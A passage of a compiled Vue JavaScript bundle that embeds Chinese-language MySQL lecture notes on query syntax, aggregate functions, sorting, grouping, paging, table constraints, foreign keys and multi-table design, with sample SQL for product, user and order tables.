  |\r\n  | <                   | 小于                                   |\r\n  | >=                  | 大于等于                               |\r\n  | <=                  | 小于等于                               |\r\n  | =                   | 等于                                   |\r\n  | <> 或 !=            | 不等于                                 |\r\n  | BETWEEN ... AND ... | 在某个范围之内(都包含)                 |\r\n  | IN(...)             | 多选一                                 |\r\n  | LIKE 占位符         | 模糊查询  _单个任意字符  %多个任意字符 |\r\n  | IS NULL             | 是NULL                                 |\r\n  | IS NOT NULL         | 不是NULL                               |\r\n  | AND 或 &&           | 并且                                   |\r\n  | OR 或 \\|\\|          | 或者                                   |\r\n  | NOT 或 !            | 非，不是                               |\r\n\r\n  - 条件查询语法\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SELECT 列名 FROM 表名 WHERE 条件;\r\n  \r\n  -- 查询库存大于20的商品信息\r\n  SELECT * FROM product WHERE stock > 20;\r\n  \r\n  -- 查询品牌为华为的商品信息\r\n  SELECT * FROM product WHERE brand='华为';\r\n  \r\n  -- 查询金额在4000 ~ 6000之间的商品信息\r\n  SELECT * FROM product WHERE price >= 4000 AND price <= 6000;\r\n  SELECT * FROM product WHERE price BETWEEN 4000 AND 6000;\r\n  \r\n  -- 查询库存为14、30、23的商品信息\r\n  SELECT * FROM product WHERE stock=14 OR stock=30 OR stock=23;\r\n  SELECT * FROM product WHERE stock IN(14,30,23);\r\n  \r\n  -- 查询库存为null的商品信息\r\n  SELECT * FROM product WHERE stock IS NULL;\r\n  -- 查询库存不为null的商品信息\r\n  SELECT * FROM product WHERE stock IS NOT NULL;\r\n  \r\n  -- 查询名称以小米为开头的商品信息\r\n  SELECT * FROM product WHERE NAME LIKE '小米%';\r\n  \r\n  -- 查询名称第二个字是为的商品信息\r\n  SELECT * FROM product WHERE NAME LIKE '_为%';\r\n  \r\n  -- 查询名称为四个字符的商品信息\r\n  SELECT * FROM product WHERE NAME LIKE '____';\r\n  \r\n  -- 查询名称中包含电脑的商品信息\r\n  SELECT * FROM product WHERE NAME LIKE '%电脑%';\r\n  ```\r\n\r\n- 聚合函数\r\n\r\n  - 将一列数据作为一个整体，进行纵向的计算\r\n  - 聚合函数分类\r\n\r\n  | 函数名      | 功能                           |\r\n  | ----------- | ------------------------------ |\r\n  | count(列名) | 统计数量(一般选用不为null的列) |\r\n  | max(列名)   | 最大值                         |\r\n  | min(列名)   | 最小值                         |\r\n  | sum(列名)   | 求和                           |\r\n  | avg(列名)   | 平均值                         |\r\n\r\n  - 聚合函数语法\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SELECT 函数名(列名) FROM 表名 [WHERE 条件];\r\n  \r\n  -- 计算product表中总记录条数\r\n  SELECT COUNT(*) FROM product;\r\n  \r\n  -- 获取最高价格\r\n  SELECT MAX(price) FROM product;\r\n  -- 获取最高价格的商品名称\r\n  SELECT NAME,price FROM product WHERE price = (SELECT MAX(price) FROM product);\r\n  \r\n  -- 获取最低库存\r\n  SELECT MIN(stock) FROM product;\r\n  -- 获取最低库存的商品名称\r\n  SELECT NAME,stock FROM product WHERE stock = (SELECT MIN(stock) FROM product);\r\n  \r\n  -- 获取总库存数量\r\n  SELECT SUM(stock) FROM product;\r\n  -- 获取品牌为苹果的总库存数量\r\n  SELECT SUM(stock) FROM product WHERE brand='苹果';\r\n  \r\n  -- 获取品牌为小米的平均商品价格\r\n  SELECT AVG(price) FROM product WHERE brand='小米';\r\n  ```\r\n\r\n- 排序查询\r\n\r\n  - 排序分类\r\n    - 注意：多个排序条件，当前边的条件值一样时，才会判断第二条件\r\n\r\n  | 关键词                                   | 功能                                    |\r\n  | ---------------------------------------- | --------------------------------------- |\r\n  | ORDER BY 列名1 排序方式1,列名2 排序方式2 | 对指定列排序，ASC升序(默认的)  DESC降序 |\r\n\r\n  - 排序语法\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SELECT 列名 FROM 表名 [WHERE 条件] ORDER BY 列名1 排序方式1,列名2 排序方式2;\r\n  \r\n  -- 按照库存升序排序\r\n  SELECT * FROM product ORDER BY stock ASC;\r\n  \r\n  -- 查询名称中包含手机的商品信息。按照金额降序排序\r\n  SELECT * FROM product WHERE NAME LIKE '%手机%' ORDER BY price DESC;\r\n  \r\n  -- 按照金额升序排序，如果金额相同，按照库存降序排列\r\n  SELECT * FROM product ORDER BY price ASC,stock DESC;\r\n  ```\r\n\r\n- 分组查询\r\n\r\n```mysql\r\n-- 标准语法\r\nSELECT 列名 FROM 表名 [WHERE 条件] GROUP BY 分组列名 [HAVING 分组后条件过滤] [ORDER BY 排序列名 排序方式];\r\n\r\n-- 按照品牌分组，获取每组商品的总金额\r\nSELECT brand,SUM(price) FROM product GROUP BY brand;\r\n\r\n-- 对金额大于4000元的商品，按照品牌分组,获取每组商品的总金额\r\nSELECT brand,SUM(price) FROM product WHERE price > 4000 GROUP BY brand;\r\n\r\n-- 对金额大于4000元的商品，按照品牌分组，获取每组商品的总金额，只显示总金额大于7000元的\r\nSELECT brand,SUM(price) AS getSum FROM product WHERE price > 4000 GROUP BY brand HAVING getSum > 7000;\r\n\r\n-- 对金额大于4000元的商品，按照品牌分组，获取每组商品的总金额，只显示总金额大于7000元的、并按照总金额的降序排列\r\nSELECT brand,SUM(price) AS getSum FROM product WHERE price > 4000 GROUP BY brand HAVING getSum > 7000 ORDER BY getSum DESC;\r\n```\r\n\r\n- 分页查询\r\n\r\n```mysql\r\n-- 标准语法\r\nSELECT 列名 FROM 表名 [WHERE 条件] GROUP BY 分组列名 [HAVING 分组后条件过滤] [ORDER BY 排序列名 排序方式] LIMIT 开始索引,查询条数;\r\n-- 公式：开始索引 = (当前页码-1) * 每页显示的条数\r\n\r\n-- 每页显示2条数据\r\nSELECT * FROM product LIMIT 0,2;  -- 第一页 开始索引=(1-1) * 2\r\nSELECT * FROM product LIMIT 2,2;  -- 第二页 开始索引=(2-1) * 2\r\nSELECT * FROM product LIMIT 4,2;  -- 第三页 开始索引=(3-1) * 2\r\nSELECT * FROM product LIMIT 6,2;  -- 第四页 开始索引=(4-1) * 2\r\n```\r\n\r\n- 分页查询图解\r\n\r\n![05](./img/sql/mysql/MySQL基础-01-授课笔记.assets/05.png)\r\n\r\n### 四、约束\r\n\r\n#### 1.约束的概念和分类\r\n\r\n- 约束的概念\r\n  - 对表中的数据进行限定，保证数据的正确性、有效性、完整性！\r\n- 约束的分类\r\n\r\n| 约束                          | 说明           |\r\n| ----------------------------- | -------------- |\r\n| PRIMARY KEY                   | 主键约束       |\r\n| PRIMARY KEY AUTO_INCREMENT    | 主键、自动增长 |\r\n| UNIQUE                        | 唯一约束       |\r\n| NOT NULL                      | 非空约束       |\r\n| FOREIGN KEY                   | 外键约束       |\r\n| FOREIGN KEY ON UPDATE CASCADE | 外键级联更新   |\r\n| FOREIGN KEY ON DELETE CASCADE | 外键级联删除   |\r\n\r\n#### 2.主键约束\r\n\r\n- 主键约束特点\r\n  - 主键约束包含：非空和唯一两个功能\r\n  - 一张表只能有一个列作为主键\r\n  - 主键一般用于表中数据的唯一标识\r\n- 建表时添加主键约束\r\n\r\n```mysql\r\n-- 标准语法\r\nCREATE TABLE 表名(\r\n\t列名 数据类型 PRIMARY KEY,\r\n    列名 数据类型,\r\n    ...\r\n);\r\n\r\n-- 创建student表\r\nCREATE TABLE student(\r\n\tid INT PRIMARY KEY  -- 给id添加主键约束\r\n);\r\n\r\n-- 添加数据\r\nINSERT INTO student VALUES (1),(2);\r\n-- 主键默认唯一，添加重复数据，会报错\r\nINSERT INTO student VALUES (2);\r\n-- 主键默认非空，不能添加null的数据\r\nINSERT INTO student VALUES (NULL);\r\n\r\n-- 查询student表\r\nSELECT * FROM student;\r\n-- 查询student表详细\r\nDESC student;\r\n```\r\n\r\n- 删除主键\r\n\r\n```mysql\r\n-- 标准语法\r\nALTER TABLE 表名 DROP PRIMARY KEY;\r\n\r\n-- 删除主键\r\nALTER TABLE student DROP PRIMARY KEY;\r\n```\r\n\r\n- 建表后单独添加主键\r\n\r\n```mysql\r\n-- 标准语法\r\nALTER TABLE 表名 MODIFY 列名 数据类型 PRIMARY KEY;\r\n\r\n-- 添加主键\r\nALTER TABLE student MODIFY id INT PRIMARY KEY;\r\n```\r\n\r\n#### 3.主键自动增长约束\r\n\r\n- 建表时添加主键自增约束\r\n\r\n```mysql\r\n-- 标准语法\r\nCREATE TABLE 表名(\r\n\t列名 数据类型 PRIMARY KEY AUTO_INCREMENT,\r\n    列名 数据类型,\r\n    ...\r\n);\r\n\r\n-- 创建student2表\r\nCREATE TABLE student2(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT    -- 给id添加主键自增约束\r\n);\r\n\r\n-- 添加数据\r\nINSERT INTO student2 VALUES (1),(2);\r\n-- 添加null值，会自动增长\r\nINSERT INTO student2 VALUES (NULL),(NULL);\r\n\r\n-- 查询student2表\r\nSELECT * FROM student2;\r\n-- student2表详细\r\nDESC student2;\r\n```\r\n\r\n- 删除自动增长\r\n\r\n```mysql\r\n-- 标准语法\r\nALTER TABLE 表名 MODIFY 列名 数据类型;\r\n\r\n-- 删除自动增长\r\nALTER TABLE student2 MODIFY id INT;\r\n```\r\n\r\n- 建表后单独添加自动增长\r\n\r\n```mysql\r\n-- 标准语法\r\nALTER TABLE 表名 MODIFY 列名 数据类型 AUTO_INCREMENT;\r\n\r\n-- 添加自动增长\r\nALTER TABLE student2 MODIFY id INT AUTO_INCREMENT;\r\n```\r\n\r\n#### 4.唯一约束\r\n\r\n- 建表时添加唯一约束\r\n\r\n```mysql\r\n-- 标准语法\r\nCREATE TABLE 表名(\r\n\t列名 数据类型 UNIQUE,\r\n    列名 数据类型,\r\n    ...\r\n);\r\n\r\n-- 创建student3表\r\nCREATE TABLE student3(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\ttel VARCHAR(20) UNIQUE    -- 给tel列添加唯一约束\r\n);\r\n\r\n-- 添加数据\r\nINSERT INTO student3 VALUES (NULL,'18888888888'),(NULL,'18666666666');\r\n-- 添加重复数据，会报错\r\nINSERT INTO student3 VALUES (NULL,'18666666666');\r\n\r\n-- 查询student3数据表\r\nSELECT * FROM student3;\r\n-- student3表详细\r\nDESC student3;\r\n```\r\n\r\n- 删除唯一约束\r\n\r\n```mysql\r\n-- 标准语法\r\nALTER TABLE 表名 DROP INDEX 列名;\r\n\r\n-- 删除唯一约束\r\nALTER TABLE student3 DROP INDEX tel;\r\n```\r\n\r\n- 建表后单独添加唯一约束\r\n\r\n```mysql\r\n-- 标准语法\r\nALTER TABLE 表名 MODIFY 列名 数据类型 UNIQUE;\r\n\r\n-- 添加唯一约束\r\nALTER TABLE student3 MODIFY tel VARCHAR(20) UNIQUE;\r\n```\r\n\r\n#### 5.非空约束\r\n\r\n- 建表时添加非空约束\r\n\r\n```mysql\r\n-- 标准语法\r\nCREATE TABLE 表名(\r\n\t列名 数据类型 NOT NULL,\r\n    列名 数据类型,\r\n    ...\r\n);\r\n\r\n-- 创建student4表\r\nCREATE TABLE student4(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tNAME VARCHAR(20) NOT NULL    -- 给name添加非空约束\r\n);\r\n\r\n-- 添加数据\r\nINSERT INTO student4 VALUES (NULL,'张三'),(NULL,'李四');\r\n-- 添加null值，会报错\r\nINSERT INTO student4 VALUES (NULL,NULL);\r\n```\r\n\r\n- 删除非空约束\r\n\r\n```mysql\r\n-- 标准语法\r\nALTER TABLE 表名 MODIFY 列名 数据类型;\r\n\r\n-- 删除非空约束\r\nALTER TABLE student4 MODIFY NAME VARCHAR(20);\r\n```\r\n\r\n- 建表后单独添加非空约束\r\n\r\n  ```SQL\r\n  -- 标准语法\r\n  ALTER TABLE 表名 MODIFY 列名 数据类型 NOT NULL;\r\n  \r\n  -- 添加非空约束\r\n  ALTER TABLE student4 MODIFY NAME VARCHAR(20) NOT NULL;\r\n  ```\r\n\r\n  ",D={data:function(){return{MainComponent:I}}},P=D,N=Object(u["a"])(P,O,A,!1,null,"55c74377",null),q=N.exports,H=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},B=[],F="\x3c!--\r\n * @Date           : 2021-04-10 22:51:38\r\n * @FilePath       : /jinnian-space/src/pages/sql/md/MySQL数据类型.md\r\n * @Description    : \r\n--\x3e\r\n# MySQL数据类型\r\n### 各数据类型及字节长度一览表：\r\n\r\n| 数据类型           | 字节长度 | 范围或用法                                                   |\r\n| ------------------ | -------- | ------------------------------------------------------------ |\r\n| Bit                | 1        | 无符号[0,255]，有符号[-128,127]，天缘博客备注：BIT和BOOL布尔型都占用1字节 |\r\n| TinyInt            | 1        | 整数[0,255]                                                  |\r\n| SmallInt           | 2        | 无符号[0,65535]，有符号[-32768,32767]                        |\r\n| MediumInt          | 3        | 无符号[0,2^24-1]，有符号[-2^23,2^23-1]]                      |\r\n| Int                | 4        | 无符号[0,2^32-1]，有符号[-2^31,2^31-1]                       |\r\n| BigInt             | 8        | 无符号[0,2^64-1]，有符号[-2^63 ,2^63 -1]                     |\r\n| Float(M,D)         | 4        | 单精度浮点数。天缘博客提醒这里的D是精度，如果D<=24则为默认的FLOAT，如果D>24则会自动被转换为DOUBLE型。 |\r\n| Double(M,D)        | 8        | 双精度浮点。                                                 |\r\n| Decimal(M,D)       | M+1或M+2 | 未打包的浮点数，用法类似于FLOAT和DOUBLE，天缘博客提醒您如果在ASP中使用到Decimal数据类型，直接从数据库读出来的Decimal可能需要先转换成Float或Double类型后再进行运算。 |\r\n| Date               | 3        | 以YYYY-MM-DD的格式显示，比如：2009-07-19                     |\r\n| Date Time          | 8        | 以YYYY-MM-DD HH:MM:SS的格式显示，比如：2009-07-19 11：22：30 |\r\n| TimeStamp          | 4        | 以YYYY-MM-DD的格式显示，比如：2009-07-19                     |\r\n| Time               | 3        | 以HH:MM:SS的格式显示。比如：11：22：30                       |\r\n| Year               | 1        | 以YYYY的格式显示。比如：2009                                 |\r\n| Char(M)            | M        | 定长字符串。                                                 |\r\n| VarChar(M)         | M        | 变长字符串，要求M<=255                                       |\r\n| Binary(M)          | M        | 类似Char的二进制存储，特点是插入定长不足补0                  |\r\n| VarBinary(M)       | M        | 类似VarChar的变长二进制存储，特点是定长不补0                 |\r\n| Tiny Text          | Max:255  | 大小写不敏感                                                 |\r\n| Text               | Max:64K  | 大小写不敏感                                                 |\r\n| Medium Text        | Max:16M  | 大小写不敏感                                                 |\r\n| Long Text          | Max:4G   | 大小写不敏感                                                 |\r\n| TinyBlob           | Max:255  | 大小写敏感                                                   |\r\n| Blob               | Max:64K  | 大小写敏感                                                   |\r\n| MediumBlob         | Max:16M  | 大小写敏感                                                   |\r\n| LongBlob           | Max:4G   | 大小写敏感                                                   |\r\n| Enum               | 1或2     | 最大可达65535个不同的枚举值                                  |\r\n| Set                | 可达8    | 最大可达64个不同的值                                         |\r\n| Geometry           |          |                                                              |\r\n| Point              |          |                                                              |\r\n| LineString         |          |                                                              |\r\n| Polygon            |          |                                                              |\r\n| MultiPoint         |          |                                                              |\r\n| MultiLineString    |          |                                                              |\r\n| MultiPolygon       |          |                                                              |\r\n| GeometryCollection |          |                                                              |\r\n\r\n",U={data:function(){return{MainComponent:F}}},J=U,z=Object(u["a"])(J,H,B,!1,null,"92d89b9c",null),W=z.exports,$=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},G=[],V="# MySQL进阶-02-授课笔记\r\n\r\n### 一、约束\r\n\r\n#### 1.外键约束\r\n\r\n- 外键约束概念\r\n\r\n  - 让表和表之间产生关系，从而保证数据的准确性！\r\n\r\n- 建表时添加外键约束\r\n\r\n  - 为什么要有外键约束\r\n\r\n  ```mysql\r\n  -- 创建db2数据库\r\n  CREATE DATABASE db2;\r\n  -- 使用db2数据库\r\n  USE db2;\r\n  \r\n  -- 创建user用户表\r\n  CREATE TABLE USER(\r\n  \tid INT PRIMARY KEY AUTO_INCREMENT,    -- id\r\n  \tNAME VARCHAR(20) NOT NULL             -- 姓名\r\n  );\r\n  -- 添加用户数据\r\n  INSERT INTO USER VALUES (NULL,'张三'),(NULL,'李四'),(NULL,'王五');\r\n  \r\n  -- 创建orderlist订单表\r\n  CREATE TABLE orderlist(\r\n  \tid INT PRIMARY KEY AUTO_INCREMENT,    -- id\r\n  \tnumber VARCHAR(20) NOT NULL,          -- 订单编号\r\n  \tuid INT                               -- 订单所属用户\r\n  );\r\n  -- 添加订单数据\r\n  INSERT INTO orderlist VALUES (NULL,'hm001',1),(NULL,'hm002',1),\r\n  (NULL,'hm003',2),(NULL,'hm004',2),\r\n  (NULL,'hm005',3),(NULL,'hm006',3);\r\n  \r\n  -- 添加一个订单，但是没有所属用户。这合理吗？\r\n  INSERT INTO orderlist VALUES (NULL,'hm007',8);\r\n  -- 删除王五这个用户，但是订单表中王五还有很多个订单呢。这合理吗？\r\n  DELETE FROM USER WHERE NAME='王五';\r\n  \r\n  -- 所以我们需要添加外键约束，让两张表产生关系\r\n  ```\r\n\r\n  - 外键约束格式\r\n\r\n  ```mysql\r\n  CONSTRAINT 外键名 FOREIGN KEY (本表外键列名) REFERENCES 主表名(主表主键列名)\r\n  ```\r\n\r\n  - 创建表添加外键约束\r\n\r\n  ```mysql\r\n  -- 创建user用户表\r\n  CREATE TABLE USER(\r\n  \tid INT PRIMARY KEY AUTO_INCREMENT,    -- id\r\n  \tNAME VARCHAR(20) NOT NULL             -- 姓名\r\n  );\r\n  -- 添加用户数据\r\n  INSERT INTO USER VALUES (NULL,'张三'),(NULL,'李四'),(NULL,'王五');\r\n  \r\n  -- 创建orderlist订单表\r\n  CREATE TABLE orderlist(\r\n  \tid INT PRIMARY KEY AUTO_INCREMENT,    -- id\r\n  \tnumber VARCHAR(20) NOT NULL,          -- 订单编号\r\n  \tuid INT,                              -- 订单所属用户\r\n  \tCONSTRAINT ou_fk1 FOREIGN KEY (uid) REFERENCES USER(id)   -- 添加外键约束\r\n  );\r\n  -- 添加订单数据\r\n  INSERT INTO orderlist VALUES (NULL,'hm001',1),(NULL,'hm002',1),\r\n  (NULL,'hm003',2),(NULL,'hm004',2),\r\n  (NULL,'hm005',3),(NULL,'hm006',3);\r\n  \r\n  -- 添加一个订单，但是没有所属用户。无法添加\r\n  INSERT INTO orderlist VALUES (NULL,'hm007',8);\r\n  -- 删除王五这个用户，但是订单表中王五还有很多个订单呢。无法删除\r\n  DELETE FROM USER WHERE NAME='王五';\r\n  ```\r\n\r\n- 删除外键约束\r\n\r\n```mysql\r\n-- 标准语法\r\nALTER TABLE 表名 DROP FOREIGN KEY 外键名;\r\n\r\n-- 删除外键\r\nALTER TABLE orderlist DROP FOREIGN KEY ou_fk1;\r\n```\r\n\r\n- 建表后添加外键约束\r\n\r\n```mysql\r\n-- 标准语法\r\nALTER TABLE 表名 ADD CONSTRAINT 外键名 FOREIGN KEY (本表外键列名) REFERENCES 主表名(主键列名);\r\n\r\n-- 添加外键约束\r\nALTER TABLE orderlist ADD CONSTRAINT ou_fk1 FOREIGN KEY (uid) REFERENCES USER(id);\r\n```\r\n\r\n#### 2.外键的级联更新和级联删除(了解)\r\n\r\n- 什么是级联更新和级联删除\r\n  - 当我想把user用户表中的某个用户删掉，我希望该用户所有的订单也随之被删除\r\n  - 当我想把user用户表中的某个用户id修改，我希望订单表中该用户所属的订单用户编号也随之修改\r\n- 添加级联更新和级联删除\r\n\r\n```mysql\r\n-- 添加外键约束，同时添加级联更新  标准语法\r\nALTER TABLE 表名 ADD CONSTRAINT 外键名 FOREIGN KEY (本表外键列名) REFERENCES 主表名(主键列名) ON UPDATE CASCADE;\r\n\r\n-- 添加外键约束，同时添加级联删除  标准语法\r\nALTER TABLE 表名 ADD CONSTRAINT 外键名 FOREIGN KEY (本表外键列名) REFERENCES 主表名(主键列名) ON DELETE CASCADE;\r\n\r\n-- 添加外键约束，同时添加级联更新和级联删除  标准语法\r\nALTER TABLE 表名 ADD CONSTRAINT 外键名 FOREIGN KEY (本表外键列名) REFERENCES 主表名(主键列名) ON UPDATE CASCADE ON DELETE CASCADE;\r\n\r\n\r\n-- 删除外键约束\r\nALTER TABLE orderlist DROP FOREIGN KEY ou_fk1;\r\n\r\n-- 添加外键约束，同时添加级联更新和级联删除\r\nALTER TABLE orderlist ADD CONSTRAINT ou_fk1 FOREIGN KEY (uid) REFERENCES USER(id) ON UPDATE CASCADE ON DELETE CASCADE;\r\n\r\n-- 将王五用户的id修改为5    订单表中的uid也随之被修改\r\nUPDATE USER SET id=5 WHERE id=3;\r\n\r\n-- 将王五用户删除     订单表中该用户所有订单也随之删除\r\nDELETE FROM USER WHERE id=5;\r\n```\r\n\r\n### 二、多表设计\r\n\r\n#### 1.一对一(了解)\r\n\r\n- 分析\r\n  - 人和身份证。一个人只有一个身份证，一个身份证只能对应一个人！\r\n- 实现原则\r\n  - 在任意一个表建立外键，去关联另外一个表的主键\r\n- SQL演示\r\n\r\n```mysql\r\n-- 创建db5数据库\r\nCREATE DATABASE db5;\r\n-- 使用db5数据库\r\nUSE db5;\r\n\r\n-- 创建person表\r\nCREATE TABLE person(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tNAME VARCHAR(20)\r\n);\r\n-- 添加数据\r\nINSERT INTO person VALUES (NULL,'张三'),(NULL,'李四');\r\n\r\n-- 创建card表\r\nCREATE TABLE card(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tnumber VARCHAR(50),\r\n\tpid INT UNIQUE,\r\n\tCONSTRAINT cp_fk1 FOREIGN KEY (pid) REFERENCES person(id) -- 添加外键\r\n);\r\n-- 添加数据\r\nINSERT INTO card VALUES (NULL,'12345',1),(NULL,'56789',2);\r\n```\r\n\r\n- 图解\r\n\r\n![01](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/01.png)\r\n\r\n#### 2.一对多\r\n\r\n- 分析\r\n  - 用户和订单。一个用户可以有多个订单！\r\n  - 商品分类和商品。一个分类下可以有多个商品！\r\n- 实现原则\r\n  - 在多的一方，建立外键约束，来关联一的一方主键\r\n- SQL演示\r\n\r\n```mysql\r\n/*\r\n\t用户和订单\r\n*/\r\n-- 创建user表\r\nCREATE TABLE USER(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tNAME VARCHAR(20)\r\n);\r\n-- 添加数据\r\nINSERT INTO USER VALUES (NULL,'张三'),(NULL,'李四');\r\n\r\n-- 创建orderlist表\r\nCREATE TABLE orderlist(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tnumber VARCHAR(20),\r\n\tuid INT,\r\n\tCONSTRAINT ou_fk1 FOREIGN KEY (uid) REFERENCES USER(id)  -- 添加外键约束\r\n);\r\n-- 添加数据\r\nINSERT INTO orderlist VALUES (NULL,'hm001',1),(NULL,'hm002',1),(NULL,'hm003',2),(NULL,'hm004',2);\r\n\r\n\r\n/*\r\n\t商品分类和商品\r\n*/\r\n-- 创建category表\r\nCREATE TABLE category(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tNAME VARCHAR(10)\r\n);\r\n-- 添加数据\r\nINSERT INTO category VALUES (NULL,'手机数码'),(NULL,'电脑办公');\r\n\r\n-- 创建product表\r\nCREATE TABLE product(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tNAME VARCHAR(30),\r\n\tcid INT,\r\n\tCONSTRAINT pc_fk1 FOREIGN KEY (cid) REFERENCES category(id)  -- 添加外键约束\r\n);\r\n-- 添加数据\r\nINSERT INTO product VALUES (NULL,'华为P30',1),(NULL,'小米note3',1),\r\n(NULL,'联想电脑',2),(NULL,'苹果电脑',2);\r\n```\r\n\r\n- 图解\r\n\r\n![02](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/02.png)\r\n\r\n#### 3.多对多\r\n\r\n- 分析\r\n  - 学生和课程。一个学生可以选择多个课程，一个课程也可以被多个学生选择！\r\n- 实现原则\r\n  - 需要借助第三张表中间表，中间表至少包含两个列，这两个列作为中间表的外键，分别关联两张表的主键\r\n- SQL演示\r\n\r\n```mysql\r\n-- 创建student表\r\nCREATE TABLE student(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tNAME VARCHAR(20)\r\n);\r\n-- 添加数据\r\nINSERT INTO student VALUES (NULL,'张三'),(NULL,'李四');\r\n\r\n-- 创建course表\r\nCREATE TABLE course(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tNAME VARCHAR(10)\r\n);\r\n-- 添加数据\r\nINSERT INTO course VALUES (NULL,'语文'),(NULL,'数学');\r\n\r\n-- 创建中间表\r\nCREATE TABLE stu_course(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tsid INT, -- 用于和student表的id进行外键关联\r\n\tcid INT, -- 用于和course表的id进行外键关联\r\n\tCONSTRAINT sc_fk1 FOREIGN KEY (sid) REFERENCES student(id), -- 添加外键约束\r\n\tCONSTRAINT sc_fk2 FOREIGN KEY (cid) REFERENCES course(id)   -- 添加外键约束\r\n);\r\n-- 添加数据\r\nINSERT INTO stu_course VALUES (NULL,1,1),(NULL,1,2),(NULL,2,1),(NULL,2,2);\r\n```\r\n\r\n- 图解\r\n\r\n![03](./img/sql/mysql/MySQL进阶-02-授课笔记.assets/03.png)\r\n\r\n### 三、多表查询\r\n\r\n#### 1.多表查询-数据准备\r\n\r\n- SQL语句\r\n\r\n```mysql\r\n-- 创建db6数据库\r\nCREATE DATABASE db6;\r\n-- 使用db6数据库\r\nUSE db6;\r\n\r\n-- 创建user表\r\nCREATE TABLE USER(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\t-- 用户id\r\n\tNAME VARCHAR(20),\t\t\t        -- 用户姓名\r\n\tage INT                             -- 用户年龄\r\n);\r\n-- 添加数据\r\nINSERT INTO USER VALUES (1,'张三',23);\r\nINSERT INTO USER VALUES (2,'李四',24);\r\nINSERT INTO USER VALUES (3,'王五',25);\r\nINSERT INTO USER VALUES (4,'赵六',26);\r\n\r\n\r\n-- 订单表\r\nCREATE TABLE orderlist(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\t-- 订单id\r\n\tnumber VARCHAR(30),\t\t\t\t\t-- 订单编号\r\n\tuid INT,    -- 外键字段\r\n\tCONSTRAINT ou_fk1 FOREIGN KEY (uid) REFERENCES USER(id)\r\n);\r\n-- 添加数据\r\nINSERT INTO orderlist VALUES (1,'hm001',1);\r\nINSERT INTO orderlist VALUES (2,'hm002',1);\r\nINSERT INTO orderlist VALUES (3,'hm003',2);\r\nINSERT INTO orderlist VALUES (4,'hm004',2);\r\nINSERT INTO orderlist VALUES (5,'hm005',3);\r\nINSERT INTO orderlist VALUES (6,'hm006',3);\r\nINSERT INTO orderlist VALUES (7,'hm007',NULL);\r\n\r\n\r\n-- 商品分类表\r\nCREATE TABLE category(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,  -- 商品分类id\r\n\tNAME VARCHAR(10)                    -- 商品分类名称\r\n);\r\n-- 添加数据\r\nINSERT INTO category VALUES (1,'手机数码');\r\nINSERT INTO category VALUES (2,'电脑办公');\r\nINSERT INTO category VALUES (3,'烟酒茶糖');\r\nINSERT INTO category VALUES (4,'鞋靴箱包');\r\n\r\n\r\n-- 商品表\r\nCREATE TABLE product(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,   -- 商品id\r\n\tNAME VARCHAR(30),                    -- 商品名称\r\n\tcid INT, -- 外键字段\r\n\tCONSTRAINT cp_fk1 FOREIGN KEY (cid) REFERENCES category(id)\r\n);\r\n-- 添加数据\r\nINSERT INTO product VALUES (1,'华为手机',1);\r\nINSERT INTO product VALUES (2,'小米手机',1);\r\nINSERT INTO product VALUES (3,'联想电脑',2);\r\nINSERT INTO product VALUES (4,'苹果电脑',2);\r\nINSERT INTO product VALUES (5,'中华香烟',3);\r\nINSERT INTO product VALUES (6,'玉溪香烟',3);\r\nINSERT INTO product VALUES (7,'计生用品',NULL);\r\n\r\n\r\n-- 中间表\r\nCREATE TABLE us_pro(\r\n\tupid INT PRIMARY KEY AUTO_INCREMENT,  -- 中间表id\r\n\tuid INT, -- 外键字段。需要和用户表的主键产生关联\r\n\tpid INT, -- 外键字段。需要和商品表的主键产生关联\r\n\tCONSTRAINT up_fk1 FOREIGN KEY (uid) REFERENCES USER(id),\r\n\tCONSTRAINT up_fk2 FOREIGN KEY (pid) REFERENCES product(id)\r\n);\r\n-- 添加数据\r\nINSERT INTO us_pro VALUES (NULL,1,1);\r\nINSERT INTO us_pro VALUES (NULL,1,2);\r\nINSERT INTO us_pro VALUES (NULL,1,3);\r\nINSERT INTO us_pro VALUES (NULL,1,4);\r\nINSERT INTO us_pro VALUES (NULL,1,5);\r\nINSERT INTO us_pro VALUES (NULL,1,6);\r\nINSERT INTO us_pro VALUES (NULL,1,7);\r\nINSERT INTO us_pro VALUES (NULL,2,1);\r\nINSERT INTO us_pro VALUES (NULL,2,2);\r\nINSERT INTO us_pro VALUES (NULL,2,3);\r\nINSERT INTO us_pro VALUES (NULL,2,4);\r\nINSERT INTO us_pro VALUES (NULL,2,5);\r\nINSERT INTO us_pro VALUES (NULL,2,6);\r\nINSERT INTO us_pro VALUES (NULL,2,7);\r\nINSERT INTO us_pro VALUES (NULL,3,1);\r\nINSERT INTO us_pro VALUES (NULL,3,2);\r\nINSERT INTO us_pro VALUES (NULL,3,3);\r\nINSERT INTO us_pro VALUES (NULL,3,4);\r\nINSERT INTO us_pro VALUES (NULL,3,5);\r\nINSERT INTO us_pro VALUES (NULL,3,6);\r\nINSERT INTO us_pro VALUES (NULL,3,7);\r\nINSERT INTO us_pro VALUES (NULL,4,1);\r\nINSERT INTO us_pro VALUES (NULL,4,2);\r\nINSERT INTO 